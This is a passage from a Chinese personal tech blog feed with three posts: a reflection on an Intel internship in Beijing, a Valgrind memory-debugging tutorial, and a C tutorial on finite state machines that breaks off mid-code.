    <link href="/2018/09/09/%E6%88%91%E5%9C%A8%E5%8C%97%E4%BA%AC%E5%AE%9E%E4%B9%A0%E7%9A%84%E5%9B%9B%E4%B8%AA%E6%9C%88/"/>
    <url>/2018/09/09/%E6%88%91%E5%9C%A8%E5%8C%97%E4%BA%AC%E5%AE%9E%E4%B9%A0%E7%9A%84%E5%9B%9B%E4%B8%AA%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<p>今天终于要离开北京了，正式结束在Intel的实习生旅程。现在在首都机场写下这4个月来在北京生活、在Intel实习的一些见闻和感悟。</p><h2 id="在Intel的实习"><a href="#在Intel的实习" class="headerlink" title="在Intel的实习"></a>在Intel的实习</h2><p>4月初的时候拿到了Intel的实习机会，当时还是非常兴奋的，因为毕竟Intel作为世界顶级科技公司，有机会去里面当软件工程师实习生还是一段很有意思的经历。当然四个月下来，确实收获很多。我参与项目组是Intel Sports Group，项目做的主要是利用计算机视觉来做体育直播视频的分析（比如球、运动员的检测和跟踪，精彩时刻的识别等）、三维重建，让观看体育直播的观众们能够身临其境般地体验到比赛场地上的各种场景。我加入是system team，做的是怎么将各种Deep Learning算法模块组合成一个高吞吐、低延迟的高性能分布式系统，所以我们team做的就是怎么设计和搭建这种AI System。当时实习找的方向也是Computer Vision System方向的一些实习，因为研一时期一整年都在做计算机视觉偏算法层面的工作，负责了我们学校票据识别系统的核心识别算法的研究和系统的搭建，虽然系统在功能上是OK了，但是从系统层面考虑上，却欠缺比较宏观的思考和设计，总的而言这个系统太学生气，在稳定性、扩展性和性能方面都非常差。所以我在找实习时找的方向就是AI System方向的，希望到大公司看看他们要设计一个工业级的AI System会采取什么思路和技术。最后找到这么一个实习还是跟我的方向非常macth，这真是太幸运了。</p><p>在Intel当实习生还是非常幸福，公司对实习生还是比较重视，至少在给了我们这群实习生比较大的操作空间，比如源码对实习生全部开放，我们系统组的也可去看看算法组的代码实现，除此之外实习生一般都会被安排做一些探索性的工作，我在项目组负责的任务主要是一个新的任务调度框架（super-service）的实现、NFL新的pinelining探索、想方设法让整个系统做到实时。4个月来，60+次commit和和6000+行代码，证明了我这段实习经历并没有太划水，现在最希望的是能有朝一日在电视看到我们项目组的产品，这样子我写的代码才真正赋予了价值。</p><p>Intel的工作比较宽松，不需要打卡，每天把自己的工作做好就行了，因为大家都很自觉，所以这边没有加班氛围。我在所在的机构是英特尔中国研究中心，就我们项目组而言，大家的学历背景都相当高，基本都是985硕士起步，博士也很多，当然最多的还是清北人，比如我的导师，就是清华毕业的大佬，性格又平易近人，平时跟他讨论方案时感觉思路都快赶不上了，老是叫他能不能再解释一遍。我导师真是一个非常厉害的人，有时还跟我们说他当年和楼教主的在TopCoder上PK抢分的往事，听得我一晃一晃的。</p><p>外企很注意流程和规范，我们组的风格也是如此。我在这边确实接触到了很多工业界做产品开发的一些常用工具，GitHub做代码仓库（到这儿我才发现，原来企业也用GitHub），微服想，容器技术，用K8S做容器调度，pipelining做加速，Redis的使用，GFS，map-reduce。很多很多相关的技术，我都觉得可以运用到我的票据识别系统上，至少知道，要优化一个系统，怎么让他做大做强有哪些常用的思路可以尝试，回到学校后还是要好好继续设计我的票据识别系统，做成一个高性能的通用大规模OCR分布式系统。</p><h2 id="在北京的生活"><a href="#在北京的生活" class="headerlink" title="在北京的生活"></a>在北京的生活</h2><p>在北京呆了4个月了，除了在公司实习，剩下是时间就是生活啦。很高兴在住的地方遇到了一群优秀、好玩的小伙伴们，让我在北京的4个月没有感到孤独。来北京之后最大的感触就是，北京真是一个聚集各种人才的地方，大家喜欢从四面八方来到中国最繁华的地方需求工作学习的机会。在住的地方遇到了有太多太优秀的人才了，清北的，斯坦福的，UCL的，密歇根的，即使没有名校毕业的背景小伙伴，在其他方面都有很强的能力。他们都有很强的目标性，知道自己将来要做些什么，现在又该做哪些准备，比如有个大二学生就跑过来北京实习刷经历了。在这么多人交往中有两个小发现，第一个小发现是，来北京实习或者找工作的海外留学生很多。第二个小发现就是大家都喜欢追逐高学历，至少硕士，但大多数人还是计划读博，尤其是女生，这个比例更大。因为身边的想读博小伙伴们太多，使得我一度也花了一段时间思考我自己到底喜不喜欢科研，适不适合读博。</p><p>作为一个南方人，初来北京真的很不习惯，第一是空气，北京的空气真的非常差，雾霾严重，鼻子刚来的时候会很酸，但是后来习惯就好了。还有就是北京比广州干燥，因此我来北京不久手心就开始掉皮了。第二是饮食，北京的后吃的东西与广州相比真的少太多了，这边吃的东西都是偏咸，而且这边也没有吃青菜的习惯。第三是交通，因为北京是不禁摩的，所以路面上车多复杂，各类型的车各种穿梭，尤其是在人行横道绿灯过马路时，我们行人还要小心自己右边可能还会有小车左转冲出来跟你抢位置，在广州的话，这种情况就不会发生啦，因为广州的十字路口基本都带转向红绿灯。以上就是我在北京生活4个月的一些小小的感受。说到底，还是觉得我们大广东适合我生活：）</p><h2 id="溜了溜了"><a href="#溜了溜了" class="headerlink" title="溜了溜了"></a>溜了溜了</h2><p>时间过得真的非常快，想不到今天就要离开北京了，心里有点复杂，既有学有所成返回家乡的兴奋，也有难舍小伙伴的伤感。我第一天来北京的情景还历历在目：拖着行李箱，一出机场看到满天的飞絮，我心头不禁一愣，怎么北京飘着这玩意啊？天天飘着这个还怎么生活啊！后面才知道这叫做飘絮，北方每到这时分就会满城飘絮。今天是离开之日却是秋高气爽，阳光明媚，蓝天白云，清风徐来还有点凉意，估计是秋天的感觉吧。</p><p>在北京Intel实习的日子里，眼界开阔了很多，见到了太多优秀且谦逊的人，也看到了自己与别人的差距，从与他们的交谈中可以很清楚的看到，自己的眼界真的是太低太低了。研究生明年就要毕业了，家里人读书不多，想法都很简单，不求大富大贵，希望孩子找一些事业单位公务员什么的稳稳定定生活就好。自己作为可能有能力改变家庭命运的第一代人，自己的想法还有很多，私企？国企？外企？公务员？还有最近去了北京才萌生的读博念头，现在貌似每条路都有很好的机会，每条路都是很好的选择，自己现在的想法还是，把技术做到极致，专注技术才能让我每天过得开心和踏实。最后上一张在公司拍的一张照片，一眼望去，真是美极了。</p><p><img src="/2018/09/09/%E6%88%91%E5%9C%A8%E5%8C%97%E4%BA%AC%E5%AE%9E%E4%B9%A0%E7%9A%84%E5%9B%9B%E4%B8%AA%E6%9C%88/1.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>成长</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存问题检测神器：Valgrind</title>
    <link href="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/"/>
    <url>/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/</url>
    
    <content type="html"><![CDATA[<p>在写大型C/C++工程时难免会发生内存泄漏现象，系统编程中一个重要的方面就是有效地处理与内存相关的问题。你的工作越接近系统，你就需要面对越多的内存问题。有时这些问题非常琐碎，而更多时候它会演变成一个调试内存问题的恶梦。 常见的内存问题一共七种：</p><ol><li>动态内存泄露；</li><li>资源泄露，比如文件指针不关闭；</li><li>动态内存越界；</li><li>数组内存越界；</li><li>动态内存double free；</li><li>使用野指针，即未初始化的指针；</li><li>释放野指针，即未初始化的指针。</li></ol><p>内存问题非常难定位，对于小工程来说，简单去检查代码中new和delete的匹配对数就基本能定位到问题，但是一旦代码量上升到以万单位时，仅靠肉眼检查来定位问题那就非常困难了，所以我们需要利用工具帮助我们找出问题所在。在Linux系统下内存检测工具首推Valgrind，一款非常好用的开源内存管理框架。Valgrind其实是一个工具集，内存错误检测只是它众多功能的一个，但我们用得最多的功能正是它——memcheck。</p><p>该工具可以检测下列与内存相关的问题 :</p><ul><li>未释放内存的使用</li><li>对释放后内存的读/写</li><li>对已分配内存块尾部的读/写</li><li>内存泄露</li><li>不匹配的使用malloc/new/new[] 和 free/delete/delete[]</li><li>重复释放内存</li></ul><p>首先安装Valgrind非常简单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;valgrind下载：</span><br><span class="line">http:&#x2F;&#x2F;valgrind.org&#x2F;downloads&#x2F;valgrind-3.12.0.tar.bz2</span><br><span class="line"></span><br><span class="line">valgrind安装：</span><br><span class="line">1. tar -jxvf valgrind-3.12.0.tar.bz2</span><br><span class="line">2. cd valgrind-3.12.0</span><br><span class="line">3. .&#x2F;configure</span><br><span class="line">4. make</span><br><span class="line">5. sudo make install</span><br></pre></td></tr></table></figure><p>下面开始讲解Valgrind的应用场景。</p><p>注意: 下面讨论的所有测试代码都应该使用gcc/g++并且加上-g选项。</p><h2 id="1-使用未初始化的内存（使用野指针）"><a href="#1-使用未初始化的内存（使用野指针）" class="headerlink" title="1. 使用未初始化的内存（使用野指针）"></a>1. 使用未初始化的内存（使用野指针）</h2><p>这里我们定义了一个指针p，但并未给他开辟空间，即他是一个野指针，但我们却使用它了。</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193554002-1364573355.jpg"></p><p>Valgrind检测出我们程序使用了未初始化的变量，但并未检测出内存泄漏。</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193604735-1875378577.jpg"></p><h2 id="2-在内存被释放后进行读-写（使用野指针）"><a href="#2-在内存被释放后进行读-写（使用野指针）" class="headerlink" title="2.在内存被释放后进行读/写（使用野指针）"></a>2.在内存被释放后进行读/写（使用野指针）</h2><p>p所指向的内存被释放了，p变成了野指针，但是我们却继续使用这片内存。</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193613574-1154240221.jpg"></p><p>Valgrind检测出我们使用了已经free掉的内存，并给出这片内存是哪里分配哪里释放的。</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193624421-247811116.jpg"></p><h2 id="3-从已分配内存块的尾部进行读-写（动态内存越界）"><a href="#3-从已分配内存块的尾部进行读-写（动态内存越界）" class="headerlink" title="3.从已分配内存块的尾部进行读/写（动态内存越界）"></a>3.从已分配内存块的尾部进行读/写（动态内存越界）</h2><p>我们动态地分配了一段数组，但我们在访问个数组时发生了越界读写，程序crash掉。</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193638871-928305119.jpg"></p><p>Valgrind检测出越界的位置。</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193651410-2101563201.jpg"></p><p>注意：Valgrind不检查静态分配数组的使用情况！所以对静态分配的数组，Valgrind表示无能为力！比如下面的例子，程序crash掉，我们却不知道为什么。</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193706246-508790416.jpg"></p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193716994-628209858.jpg"></p><h2 id="4-内存泄漏"><a href="#4-内存泄漏" class="headerlink" title="4.内存泄漏"></a>4.内存泄漏</h2><p>内存泄漏的原因在于没有成对地使用malloc/free和new/delete，比如下面的例子。</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193726929-641784050.jpg"></p><p>Valgrind会给出程序中malloc和free的出现次数以判断是否发生内存泄漏，比如对上面的程序运行memcheck，Valgrind的记录显示上面的程序用了1次malloc，却调用了0次free，明显发生了内存泄漏！</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193738724-1869262186.jpg"></p><p>上面提示了我们可以使用–leak-check=full进一步获取内存泄漏的信息，比如malloc和free的具体行号。</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193750769-1501914916.jpg"></p><h2 id="5-不匹配地使用malloc-new-new-和-free-delete-delete"><a href="#5-不匹配地使用malloc-new-new-和-free-delete-delete" class="headerlink" title="5. 不匹配地使用malloc/new/new[] 和 free/delete/delete[]"></a>5. 不匹配地使用malloc/new/new[] 和 free/delete/delete[]</h2><p>正常使用new/delete和malloc/free是这样子的：</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193802975-763647802.jpg"></p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193817047-1922627647.jpg"></p><p>而不匹配地使用malloc/new/new[] 和 free/delete/delete[]则会被提示mismacth：</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193830425-1531404607.jpg"></p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193844415-122107118.jpg"></p><h2 id="6-两次释放内存"><a href="#6-两次释放内存" class="headerlink" title="6.两次释放内存"></a>6.两次释放内存</h2><p>double free的情况同样是根据malloc/free的匹配对数来体现的，比如free多了一次，Valgrind也会提示。</p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193909777-1273155147.jpg"></p><p><img src="/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/1093303-20180413193923068-1690539405.jpg"></p><p>当然，Valgrind也不是万能的。Valgrind也有无法找到问题的时候，有些问题只能通过不断的review代码找到了症结。发现问题，解决问题，毕竟是末流。最好的方法，就是不引入内存问题。这可以通过良好的代码风格和设计来实现的。</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>内存</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有限状态机FSM的理解与实现</title>
    <link href="/2017/06/23/%E6%9C%89%E9%99%90%E7%8A%B6%E6%80%81%E6%9C%BAFSM%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <url>/2017/06/23/%E6%9C%89%E9%99%90%E7%8A%B6%E6%80%81%E6%9C%BAFSM%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>有限状态机（finite state machine）简称FSM，表示有限个状态及在这些状态之间的转移和动作等行为的数学模型，在计算机领域有着广泛的应用。FSM是一种逻辑单元内部的一种高效编程方法，在服务器编程中，服务器可以根据不同状态或者消息类型进行相应的处理逻辑，使得程序逻辑清晰易懂。</p><p><strong>那有限状态机通常在什么地方被用到？</strong></p><p>处理程序语言或者自然语言的 tokenizer,自底向上解析语法的parser，<br>各种通信协议发送方和接受方传递数据对消息处理，游戏AI等都有应用场景。</p><p>状态机有以下几种实现方法，我将一一阐述它们的优缺点。</p><h2 id="一、使用if-else-if语句实现的FSM"><a href="#一、使用if-else-if语句实现的FSM" class="headerlink" title="一、使用if/else if语句实现的FSM"></a>一、使用if/else if语句实现的FSM</h2><p>使用if/else if语句是实现的FSM最简单最易懂的方法，我们只需要通过大量的if /else if语句来判断状态值来执行相应的逻辑处理。</p><p>看看下面的例子，我们使用了大量的if/else if语句实现了一个简单的状态机，做到了根据状态的不同执行相应的操作，并且实现了状态的跳转。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;比如我们定义了小明一天的状态如下</span><br><span class="line">enum</span><br><span class="line">&#123;</span><br><span class="line">GET_UP,</span><br><span class="line">GO_TO_SCHOOL,</span><br><span class="line">HAVE_LUNCH,</span><br><span class="line">GO_HOME,</span><br><span class="line">DO_HOMEWORK,</span><br><span class="line">SLEEP,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int state &#x3D; GET_UP;</span><br><span class="line">&#x2F;&#x2F;小明的一天</span><br><span class="line">while (1)</span><br><span class="line">&#123;</span><br><span class="line">if (state &#x3D;&#x3D; GET_UP)</span><br><span class="line">&#123;</span><br><span class="line">GetUp(); &#x2F;&#x2F;具体调用的函数</span><br><span class="line">state &#x3D; GO_TO_SCHOOL;  &#x2F;&#x2F;状态的转移</span><br><span class="line">&#125;</span><br><span class="line">else if (state &#x3D;&#x3D; GO_TO_SCHOOL)</span><br><span class="line">&#123;</span><br><span class="line">Go2School();</span><br><span class="line">state &#x3D; HAVE_LUNCH;</span><br><span class="line">&#125;</span><br><span class="line">else if (state &#x3D;&#x3D; HAVE_LUNCH)</span><br><span class="line">&#123;</span><br><span class="line">HaveLunch();</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">else if (state &#x3D;&#x3D; SLEEP)</span><br><span class="line">&#123;</span><br><span class="line">Go2Bed();</span><br><span class="line">state &#x3D; GET_UP;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看完上面的例子，大家有什么感受？是不是感觉程序虽然简单易懂，但是使用了大量的if判断语句，使得代码很低端，同时代码膨胀的比较厉害。这个状态机的状态仅有几个，代码膨胀并不明显，但是如果我们需要处理的状态有数十个的话，该状态机的代码就不好读了。</p><h2 id="二、使用switch实现FSM"><a href="#二、使用switch实现FSM" class="headerlink" title="二、使用switch实现FSM"></a>二、使用switch实现FSM</h2><p>使用switch语句实现的FSM的结构变得更为清晰了，其缺点也是明显的：这种设计方法虽然简单，通过一大堆判断来处理，适合小规模的状态切换流程，但如果规模扩大难以扩展和维护。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int state &#x3D; GET_UP;</span><br><span class="line">&#x2F;&#x2F;小明的一天</span><br><span class="line">while (1)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">switch(state)</span><br><span class="line">&#123;</span><br><span class="line">case GET_UP:</span><br><span class="line">GetUp(); &#x2F;&#x2F;具体调用的函数</span><br><span class="line">state &#x3D; GO_TO_SCHOOL;  &#x2F;&#x2F;状态的转移</span><br><span class="line">break;</span><br><span class="line">case GO_TO_SCHOOL:</span><br><span class="line">Go2School();</span><br><span class="line">state &#x3D; HAVE_LUNCH;</span><br><span class="line">break;</span><br><span class="line">case HAVE_LUNCH:</span><br><span class="line">HaveLunch();</span><br><span class="line">state &#x3D; GO_HOME;</span><br><span class="line">break;</span><br><span class="line">...</span><br><span class="line">default:</span><br><span class="line">break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="三、使用函数指针实现FSM"><a href="#三、使用函数指针实现FSM" class="headerlink" title="三、使用函数指针实现FSM"></a>三、使用函数指针实现FSM</h2><p>使用函数指针实现FSM的思路：建立相应的状态表和动作查询表，根据状态表、事件、动作表定位相应的动作处理函数，执行完成后再进行状态的切换。</p><p>当然使用函数指针实现的FSM的过程还是比较费时费力，但是这一切都是值得的，因为当你的程序规模大时候，基于这种表结构的状态机，维护程序起来也是得心应手。</p><p>下面给出一个使用函数指针实现的FSM的框架：</p><p>我们还是以“小明的一天”为例设计出该FSM。</p><p>先给出该FSM的状态转移图：<br><img src="/2017/06/23/%E6%9C%89%E9%99%90%E7%8A%B6%E6%80%81%E6%9C%BAFSM%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%AE%9E%E7%8E%B0/1093303-20170623190453773-1051238237.png"></p><p><strong>下面讲解关键部分代码实现</strong></p><p>首先我们定义出小明一天的活动状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;比如我们定义了小明一天的状态如下</span><br><span class="line">enum</span><br><span class="line">&#123;</span><br><span class="line">GET_UP,</span><br><span class="line">GO_TO_SCHOOL,</span><br><span class="line">HAVE_LUNCH,</span><br><span class="line">DO_HOMEWORK,</span><br><span class="line">SLEEP,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们也定义出会发生的事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enum</span><br><span class="line">&#123;</span><br><span class="line">EVENT1 &#x3D; 1,</span><br><span class="line">EVENT2,</span><br><span class="line">EVENT3,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>定义状态表的数据结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct FsmTable_s</span><br><span class="line">&#123;</span><br><span class="line">int event;   &#x2F;&#x2F;事件</span><br><span class="line">int CurState;  &#x2F;&#x2F;当前状态</span><br><span class="line">void (*eventActFun)();  &#x2F;&#x2F;函数指针</span><br><span class="line">int NextState;  &#x2F;&#x2F;下一个状态</span><br><span class="line">&#125;FsmTable_t;</span><br></pre></td></tr></table></figure><p>接下来定义出最重要FSM的状态表，我们整个FSM就是根据这个定义好的表来运转的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">FsmTable_t XiaoMingTable[] &#x3D;</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;&#123;到来的事件，当前的状态，将要要执行的函数，下一个状态&#125;</span><br><span class="line">&#123; EVENT2,  SLEEP,           GetUp,        GET_UP &#125;,</span><br><span class="line">&#123; EVENT1,  GET_UP,          Go2School,    GO_TO_SCHOOL &#125;,</span><br><span class="line">&#123; EVENT2,  GO_TO_SCHOOL,    HaveLunch,    HAVE_LUNCH &#125;,</span><br><span class="line">&#123; EVENT3,  HAVE_LUNCH,      DoHomework,   DO_HOMEWORK &#125;,</span><br><span class="line">&#123; EVENT1,  DO_HOMEWORK,     Go2Bed,       SLEEP &#125;,</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;add your codes here</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>状态机的注册、状态转移、事件处理的动作实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*状态机注册*&#x2F;</span><br><span class="line">void FSM_Regist(FSM_t* pFsm, FsmTable_t* pTable)</span><br><span class="line">&#123;</span><br><span class="line">pFsm-&gt;FsmTable &#x3D; pTable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*状态迁移*&#x2F;</span><br><span class="line">void FSM_StateTransfer(FSM_t* pFsm, int state)</span><br><span class="line">&#123;</span><br><span class="line">pFsm-&gt;curState &#x3D; state;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*事件处理*&#x2F;</span><br><span class="line">void FSM_EventHandle(FSM_t* pFsm, int event)</span><br><span class="line">&#123;</span><br><span class="line">FsmTable_t* pActTable &#x3D; pFsm-&gt;FsmTable;</span><br><span class="line">void (*eventActFun)() &#x3D; NULL;  &#x2F;&#x2F;函数指针初始化为空</span><br><span class="line">int NextState;</span><br><span class="line">int CurState &#x3D; pFsm-&gt;curState;</span><br><span class="line">int flag &#x3D; 0; &#x2F;&#x2F;标识是否满足条件</span><br><span class="line">int i;</span><br><span class="line"></span><br><span class="line">&#x2F;*获取当前动作函数*&#x2F;</span><br><span class="line">for (i &#x3D; 0; i&lt;g_max_num; i++)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;当且仅当当前状态下来个指定的事件，我才执行它</span><br><span class="line">if (event &#x3D;&#x3D; pActTable[i].event &amp;&amp; CurState &#x3D;&#x3D; pActTable[i].CurState)</span><br><span class="line">&#123;</span><br><span class="line">flag &#x3D; 1;</span><br><span class="line">eventActFun &#x3D; pActTable[i].eventActFun;</span><br><span class="line">NextState &#x3D; pActTable[i].NextState;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (flag) &#x2F;&#x2F;如果满足条件了</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;*动作执行*&#x2F;</span><br><span class="line">if (eventActFun)</span><br><span class="line">&#123;</span><br><span class="line">eventActFun();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 